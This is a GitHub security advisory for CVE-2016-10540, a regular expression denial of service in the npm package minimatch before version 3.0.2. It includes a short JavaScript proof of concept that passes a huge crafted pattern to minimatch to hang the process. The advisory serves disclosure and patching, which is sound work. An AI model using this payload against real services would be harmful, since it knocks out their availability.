# [H] Regular Expression Denial of Service in minimatch

## Summary
Severity: High
Advisory: GHSA-hxm2-r34f-qmc5
CVE: CVE-2016-10540
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2018-10-09
Source: https://github.com/advisories/GHSA-hxm2-r34f-qmc5
Type: github-advisory

## Affected
- npm: `minimatch` — affected >=0 <3.0.2

## Details
Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.


## Proof of Concept
```js
var minimatch = require(“minimatch”);

// utility function for generating long strings
var genstr = function (len, chr) {
  var result = “”;
  for (i=0; i<=len; i++) {
    result = result + chr;
  }
  return result;
}

var exploit = “[!” + genstr(1000000, “\\”) + “A”;

// minimatch exploit.
console.log(“starting minimatch”);
minimatch(“foo”, exploit);
console.log(“finishing minimatch”);
```


## Recommendation

Update to version 3.0.2 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2016-10540
- https://github.com/advisories/GHSA-hxm2-r34f-qmc5
- https://www.npmjs.com/advisories/118
